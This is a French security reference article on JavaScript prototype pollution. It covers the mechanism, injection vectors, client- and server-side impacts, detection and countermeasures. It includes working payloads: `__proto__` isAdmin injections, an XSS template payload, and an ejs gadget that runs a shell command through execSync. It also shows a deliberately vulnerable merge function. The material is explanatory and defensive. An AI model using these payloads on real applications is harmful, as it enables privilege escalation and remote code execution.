---
title: Prototype Pollution
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [prototype-pollution, javascript, nodejs, web, sécurité]
date: 2026-03-22
---

# Prototype Pollution

Le Prototype Pollution est une vulnérabilité spécifique à JavaScript qui permet de modifier le prototype d'objets de base (`Object.prototype`), affectant tous les objets de l'application. Elle peut mener à la modification de comportement de l'application, des bypass d'authentification, ou du RCE côté serveur (Node.js).

## Modèle de prototype JavaScript

```javascript
// Tout objet JavaScript hérite de Object.prototype
const obj = {};
console.log(obj.__proto__ === Object.prototype); // true

// Les propriétés héritées sont disponibles sur tous les objets
Object.prototype.toString;   // disponible sur tous les objets
Object.prototype.valueOf;    // idem

// Si on modifie Object.prototype → tous les objets sont affectés
Object.prototype.polluted = "malware";
const normal_obj = {};
console.log(normal_obj.polluted); // "malware" ← propagation
```

## Mécanisme de vulnérabilité

La vulnérabilité apparaît quand du code copie récursivement des propriétés depuis un objet contrôlé par l'utilisateur, sans filtrer `__proto__`, `constructor`, ou `prototype`.

```javascript
// Fonction de merge vulnérable (très courante dans les utilitaires)
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = target[key] || {};
            merge(target[key], source[key]);  // Récursif
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Payload de l'attaquant :
const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, malicious);

// Résultat :
const victim = {};
console.log(victim.isAdmin); // true ← victim est "admin"
```

## Vecteurs d'injection

### Via paramètres URL

```
# Si l'app fait : merge(config, queryParams)
GET /page?__proto__[isAdmin]=true
GET /page?constructor[prototype][isAdmin]=true

# Équivalent JSON
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

### Via corps JSON

```
POST /api/settings
Content-Type: application/json

{
    "__proto__": {
        "isAdmin": true,
        "debugMode": true
    }
}
```

### Via propriété `constructor.prototype`

```javascript
// Alternative à __proto__ (même effet)
const payload = {};
payload.constructor.prototype.isAdmin = true;

// Via JSON (les deux vecteurs)
{"constructor": {"prototype": {"isAdmin": true}}}
```

## Impacts côté client (navigateur)

### Bypass d'authentification

```javascript
// Code vulnérable
function checkAdmin(user) {
    return user.isAdmin;  // Hérite de Object.prototype si pollué
}

// Payload : __proto__.isAdmin = true
// → checkAdmin({}) retourne true même pour un utilisateur normal
```

### XSS via pollution de propriétés

```javascript
// Si le code fait :
const options = merge(defaultOptions, userOptions);
document.getElementById('div').innerHTML = options.template;

// Payload :
{"__proto__": {"template": "<script>alert(1)</script>"}}
```

### Modification du comportement de bibliothèques

```javascript
// lodash merge (versions < 4.17.12) était vulnérable
const _ = require('lodash');
_.merge({}, JSON.parse('{"__proto__":{"polluted":1}}'));

// jQuery.extend récursif était vulnérable
$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":1}}'));
```

## Impact côté serveur — RCE Node.js

Le prototype pollution côté Node.js peut mener au RCE via des gadgets dans les dépendances.

### Via ejs (moteur de template)

```javascript
// ejs (template engine) utilise des options qui peuvent être polluées
const ejs = require('ejs');

// Gadget dans ejs (versions vulnérables) :
// Si __proto__.outputFunctionName est défini → exécuté comme code

Object.prototype.outputFunctionName = "_tmp1;process.mainModule.require('child_process').execSync('id')//";

ejs.render('<p>test</p>');  // → RCE !
```

### Via child_process options

```javascript
// Si une option de spawn/exec est polluée
Object.prototype.shell = true;
// → certaines libs utilisent shell:true par défaut si défini sur le prototype
```

### Via handlebars

```javascript
// Gadget handlebars (versions vulnérables)
Object.prototype.__defineGetter__ = function(prop, func) { return func(); };
// Combiné avec un template Handlebars → RCE
```

## Détection

```bash
# Test manuel dans Burp — ajouter __proto__ dans la requête
# Observer si le comportement de l'application change

# Test avec prototype-pollution-checker (npm)
npx is-proto-polluted

# Fuzzing avec ppfuzz
# pip install ppfuzz
ppfuzz -u "https://site.com/api" -m POST

# Dans Burp : rechercher les endpoints JSON qui font des merges
# Tester avec :
{"__proto__": {"test": "123"}}
# Puis : {}  → si "test" apparaît → pollution
```

## Contre-mesures

```javascript
// 1. Utiliser Object.create(null) — objets sans prototype
const safe = Object.create(null);  // pas de __proto__
safe.isAdmin = false;

// 2. Vérifier les clés dans les fonctions de merge
function safeMerge(target, source) {
    for (let key in source) {
        // Filtrer les clés dangereuses
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;  // Ignorer
        }
        if (typeof source[key] === 'object') {
            target[key] = target[key] || Object.create(null);
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}

// 3. Geler Object.prototype
Object.freeze(Object.prototype);
// → Toute tentative de modification lève une erreur (mode strict)
//   ou est silencieusement ignorée

// 4. Utiliser JSON.parse avec reviver
JSON.parse(userInput, (key, value) => {
    if (key === '__proto__') return undefined;
    return value;
});

// 5. Mettre à jour les dépendances
# Lodash >= 4.17.21, jQuery >= 3.4.0, etc.
npm audit
npm audit fix

// 6. Utiliser un schéma de validation (Joi, ajv)
// → Rejeter les clés __proto__ à la frontière de l'API
```
